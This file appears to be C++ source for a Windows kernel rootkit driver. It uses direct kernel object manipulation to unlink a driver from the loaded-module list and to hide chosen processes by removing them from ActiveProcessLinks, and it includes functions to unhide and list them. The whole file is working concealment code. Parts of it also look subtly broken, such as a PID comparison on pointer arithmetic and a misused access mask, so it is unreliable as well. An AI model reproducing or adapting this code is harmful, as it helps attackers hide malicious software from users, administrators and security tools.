#include "DKOM.h"
#include "ProcDkomGlobals.h"


NTSTATUS kernelobjs_hiding::HideSystemModule(DRIVER_OBJECT* DriverObject, PUNICODE_STRING DriverName) {
	// Assumes: DriverName is in "\\Driver\\DriverName" format
	PLDR_DATA_TABLE_ENTRY PreviousDriver = { 0 };
	PLDR_DATA_TABLE_ENTRY NextDriver = { 0 };
	PLDR_DATA_TABLE_ENTRY CurrentDriver = { 0 };
	HANDLE DriverHandle = NULL;
	KIRQL CurrIrql = { 0 };
	OBJECT_ATTRIBUTES DriverAttr = { 0 };
	IO_STATUS_BLOCK DriverStatus = { 0 };


	// DriverObject = NULL - object is not provided, need to find it by name: 
	if (DriverObject == NULL) {
		InitializeObjectAttributes(&DriverAttr, DriverName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
		if (!NT_SUCCESS(ZwCreateFile(&DriverHandle, OBJ_CASE_INSENSITIVE, &DriverAttr, &DriverStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)) || DriverHandle == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver process - HideSystemModule(), Could not get handle for driver %wZ\n", DriverName);
			return STATUS_UNSUCCESSFUL;
		}
		if (!NT_SUCCESS(ObReferenceObjectByHandle(DriverHandle, FILE_ALL_ACCESS, *IoFileObjectType, KernelMode, (PVOID*)&DriverObject, NULL))) {
			DbgPrintEx(0, 0, "KMDFdriver process - HideSystemModule(), Could not get driver object for driver %wZ\n", DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Get needed permissions to modify driver service entries:
	CurrIrql = KeRaiseIrqlToDpcLevel();


	// Change last to last of next and next to next of last:
	CurrentDriver = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	PreviousDriver = (PLDR_DATA_TABLE_ENTRY)CurrentDriver->InLoadOrderModuleList.Blink;
	NextDriver = (PLDR_DATA_TABLE_ENTRY)CurrentDriver->InLoadOrderModuleList.Flink;
	PreviousDriver->InLoadOrderModuleList.Flink = CurrentDriver->InLoadOrderModuleList.Flink;
	NextDriver->InLoadOrderModuleList.Blink = CurrentDriver->InLoadOrderModuleList.Blink;


	// Isolate current driver service so last and next will both point to itself:
	CurrentDriver->InLoadOrderModuleList.Blink = (PLIST_ENTRY)CurrentDriver;
	CurrentDriver->InLoadOrderModuleList.Flink = (PLIST_ENTRY)CurrentDriver;
	KeLowerIrql(CurrIrql);
	return STATUS_SUCCESS;
}


NTSTATUS process::HideProcess(USHORT ProcessId, char ProcessName[], BOOL IsStrict) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PEPROCESS CurrentProcess = NULL;
	LIST_ENTRY* CurrentList = NULL;
	LIST_ENTRY* PreviousList = NULL;
	LIST_ENTRY* NextList = NULL;
	if (ProcessId == 0) {
		if (ProcessName == NULL) {
			return STATUS_INVALID_PARAMETER;
		}
		Status = general_helpers::GetPidNameFromListADD(&ProcessId, ProcessName, TRUE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(), Get PID from process name %s failed with status 0x%x\n", ProcessName, Status);
			return Status;
		}
	}

	CurrentProcess = PsInitialSystemProcess;
	PreviousList = (LIST_ENTRY*)((ULONG64)CurrentProcess + EPOF_ActiveProcessLinks);
	CurrentList = PreviousList->Flink;
	NextList = CurrentList->Flink;

	while (CurrentList != NULL) {
		if (((USHORT)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId)) == ProcessId) {
			PreviousList->Flink = NextList;  // Also works for cases when NextList is NULL
			if (NextList != NULL) {
				NextList->Blink = PreviousList;
			}
			CurrentList->Blink = CurrentList;
			CurrentList->Flink = CurrentList;
			ProcessHide.AddToHidden(CurrentProcess);
			DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(), Found process to hide (%hu)\n", ProcessId);
			return STATUS_SUCCESS;
		}
		PreviousList = CurrentList;
		CurrentList = NextList;
		NextList = CurrentList->Flink;
		CurrentProcess = (PEPROCESS)((ULONG64)CurrentList - EPOF_ActiveProcessLinks);
	}
	DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(), Did not find process to hide (%hu)\n", ProcessId);
	if (IsStrict) {
		return STATUS_NOT_FOUND;
	}
	return STATUS_SUCCESS;
}


NTSTATUS process::UnhideProcess(USHORT ProcessId, char ProcessName[], ULONG HiddenIndex) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PEPROCESS CurrentProcess = NULL;
	PEPROCESS UnhideProcess = NULL;
	LIST_ENTRY* CurrentList = NULL;
	LIST_ENTRY* PreviousList = NULL;
	LIST_ENTRY* NextList = NULL;
	if (ProcessId == 0 && HiddenIndex == 0) {
		if (ProcessName == NULL) {
			return STATUS_INVALID_PARAMETER;
		}
		Status = general_helpers::GetPidNameFromListADD(&ProcessId, ProcessName, TRUE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver process - UnhideProcess(), Get PID from process name %s failed\n", ProcessName);
			return Status;
		}
	}
	if (HiddenIndex != 0) {
		if (!ProcessHide.RemoveFromHidden(ProcessId, HiddenIndex, &UnhideProcess)) {
			DbgPrintEx(0, 0, "KMDFdriver process %hu - UnhideProcess(), Removing form hidden failed, index based\n", ProcessId);
			return STATUS_UNSUCCESSFUL;
		}
	}
	else {
		if (!ProcessHide.RemoveFromHidden(ProcessId, ProcessHide.HiddenCount, &UnhideProcess)) {
			DbgPrintEx(0, 0, "KMDFdriver process %hu - UnhideProcess(), Removing form hidden failed, PID based\n", ProcessId);
			return STATUS_UNSUCCESSFUL;
		}
	}
	CurrentProcess = PsInitialSystemProcess;
	PreviousList = (LIST_ENTRY*)((ULONG64)CurrentProcess + EPOF_ActiveProcessLinks);
	CurrentList = PreviousList->Flink;
	NextList = CurrentList->Flink;
	while (CurrentList != NULL) {
		PreviousList = CurrentList;
		CurrentList = NextList;
		NextList = CurrentList->Flink;
		CurrentProcess = (PEPROCESS)((ULONG64)CurrentList - EPOF_ActiveProcessLinks);
	}
	PreviousList->Flink = ((LIST_ENTRY*)((ULONG64)UnhideProcess + EPOF_ActiveProcessLinks));
	((LIST_ENTRY*)((ULONG64)UnhideProcess + EPOF_ActiveProcessLinks))->Blink = PreviousList;
	((LIST_ENTRY*)((ULONG64)UnhideProcess + EPOF_ActiveProcessLinks))->Flink = NULL;
	DbgPrintEx(0, 0, "KMDFdriver process - UnhideProcess(), Found unhide placement for process %hu at the end (after %hu)\n", ProcessId, ((USHORT)((ULONG64)PreviousList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId)));
	return STATUS_SUCCESS;
}


NTSTATUS process::ListHiddenProcesses(ULONG64* ListSize, PVOID* ListAddress) {
	PEPROCESS EprocessList = NULL;
	PEPROCESS CurrentProcess = NULL;
	if (ProcessHide.BufferSize == 0) {
		*ListSize = 0;
		*ListAddress = &ProcessHide;
		DbgPrintEx(0, 0, "KMDFdriver process - ListHiddenProcesses(), List is empty!\n");
		return STATUS_SUCCESS;
	}
	EprocessList = (PEPROCESS)ExAllocatePoolWithTag(NonPagedPool, ProcessHide.BufferSize * EPROCESS1809_SIZE, 'LhPb');
	if (EprocessList == NULL) {
		*ListSize = 0;
		*ListAddress = &ProcessHide;
		DbgPrintEx(0, 0, "KMDFdriver process - ListHiddenProcesses(), Cannot allocate memory!\n");
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	for (ULONG CurrentIndex = 0; CurrentIndex < ProcessHide.HiddenCount; CurrentIndex++) {
		RtlCopyMemory(&CurrentProcess, (PVOID)((ULONG64)ProcessHide.HiddenList + (CurrentIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
		RtlCopyMemory((PVOID)((ULONG64)EprocessList + (CurrentIndex * EPROCESS1809_SIZE)), CurrentProcess, EPROCESS1809_SIZE);
	}
	*ListSize = ProcessHide.BufferSize * EPROCESS1809_SIZE;
	*ListAddress = (PVOID)EprocessList;
	DbgPrintEx(0, 0, "KMDFdriver process - ListHiddenProcesses(), (%p, %llu)\n", *ListAddress, *ListSize);
	return STATUS_SUCCESS;
}